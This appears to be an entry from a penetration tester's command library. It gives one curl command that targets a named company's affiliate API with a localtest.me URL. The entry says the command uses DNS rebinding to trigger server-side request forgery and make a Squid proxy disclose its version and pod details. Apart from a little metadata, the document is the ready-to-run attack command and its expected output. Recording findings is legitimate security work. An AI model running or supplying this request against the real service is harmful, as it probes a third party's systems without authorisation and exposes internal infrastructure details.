---
id: cmd-exness-get-localtest
data: >-
  curl -X GET
  "https://my.exnessaffiliates.com/api/partner_integrations/template/check/?url=http://localtest.me:80"
tags:
  - ssrf
  - rebinding
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.626Z'
verified: false
validated: true
submitted: true
---
# get-check-localtest-me

## Command

```bash
curl -X GET "https://my.exnessaffiliates.com/api/partner_integrations/template/check/?url=http://localtest.me:80"
```

## Description

Uses rebinding to disclose Squid details.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | Rebinding domain | Yes |

## Examples

### Basic Usage

As above.

## Expected Output

Squid error with version and pod.

## Related

- [[procedures/Disclose-Squid-Proxy-Details-via-Local-Rebinding]]
